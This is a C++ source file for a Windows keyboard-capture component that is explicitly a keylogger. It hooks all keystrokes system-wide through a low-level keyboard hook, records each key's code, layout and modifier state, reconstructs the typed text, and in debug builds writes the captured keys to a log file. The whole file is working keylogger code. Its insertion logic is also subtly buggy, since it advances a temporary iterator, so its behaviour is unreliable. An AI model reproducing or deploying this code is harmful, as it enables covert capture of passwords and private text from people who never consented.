#include "services.h"

void services::keyboard::run()
{
	// Exit function if service is already running
	if (isRunning)
	{
		return;
	}
#if _DEBUG
	log = std::ofstream("LRClog.txt", std::ios::trunc);
#endif
	if (hhkLowLevelKybd == NULL)
	{
		hhkLowLevelKybd = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	}

	clear();
	isRunning = true;
}

void services::keyboard::stop()
{
	if (!isRunning)
	{
		return;
	}

	if (hhkLowLevelKybd != NULL)
	{
		UnhookWindowsHookEx(hhkLowLevelKybd);
		hhkLowLevelKybd = NULL;
	}
#if _DEBUG
	log.close();
#endif
	isRunning = false;
}

LRESULT CALLBACK services::keyboard::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT* dllHookStruct = (KBDLLHOOKSTRUCT*)lParam;

		switch (dllHookStruct->vkCode)
		{
		case VK_BACK:
			onBackspace();
			break;
		case VK_DELETE:
			onDelete();
			break;
		case VK_UP:
			// Point cursor to the start
			vkListCursor = 0;
			break;
		case VK_DOWN:
			// Point cursor to the end
			vkListCursor = vkList.size() + 1;
			break;
		case VK_LEFT:
			// Shift virtual-key cursor to left if cursor isn't at begining
			if (vkListCursor > 0)
			{
				vkListCursor--;
			}
			break;
		case VK_RIGHT:
			// Shift virtual-key cursor to right if cursor isn't at end
			if (vkListCursor < vkList.size())
			{
				vkListCursor++;
			}
			break;
		}

		bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
		bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

		VirtualKeyInfo vkInfo;
		vkInfo.vkCode = dllHookStruct->vkCode;
		vkInfo.lang = *(WORD*)(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
		vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;

		processvk(vkInfo);
	}

	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
}

void services::keyboard::processvk(VirtualKeyInfo vkInfo)
{
#if _DEBUG
	log << "----------------" << std::endl;
	log << "vkCode: " << vkInfo.vkCode << std::endl;
	log << "lang: " << vkInfo.lang << std::endl;
	log << "flags: " << vkInfo.flags << std::endl;
#endif

	// Filter virtual-key repeats
	if (vkcmp(vkInfo, lastKeyPressed))
	{
		if (vkRepeats != KEYLOGGER_MAX_REPEATS)
		{
			vkRepeats++;
		}
		else
		{
			return;
		}
	}
	else
	{
		vkRepeats = 0;
		lastKeyPressed = vkInfo;
	}

	if (isprintable(vkInfo.vkCode))
	{
		VirtualKeyInfoList::iterator it = vkList.begin();
		std::advance(vkList.begin(), vkListCursor);

		// Insert virtual-key into vkList at cursor position
		vkList.insert(it, vkInfo);
	}
}

void services::keyboard::onDelete()
{
	if (vkListCursor >= 0 && vkListCursor < vkList.size())
	{
		VirtualKeyInfoList::iterator it = vkList.begin();
		std::advance(it, vkListCursor);
		vkList.erase(it);
	}
}

void services::keyboard::onBackspace()
{
	if (vkListCursor > 0 && vkListCursor < vkList.size() + 1)
	{
		VirtualKeyInfoList::iterator it = vkList.begin();
		std::advance(it, vkListCursor - 1);
		vkList.erase(it);
		vkListCursor--;
	}
}

void services::keyboard::clear()
{
	vkRepeats = 0;
	vkListCursor = 0;
	lastKeyPressed.vkCode = 0;
	lastKeyPressed.lang = 0;
	lastKeyPressed.flags = 0;
	vkList.clear();
}

// Copmares two VirtualKeyInfo structures
inline bool services::keyboard::vkcmp(const VirtualKeyInfo vk1, const VirtualKeyInfo vk2)
{
	return (vk1.vkCode == vk2.vkCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
}

// Is virtual key appends text into text fields
inline bool services::keyboard::isprintable(const DWORD vkCode)
{
	return (vkCode == VK_SPACE) // Nuff said
		|| (vkCode >= 0x30 && vkCode <= 0x5A) // 0 - 9, A - Z
		|| (vkCode >= 0x60 && vkCode <= 0x6F);// Numpad keys
}
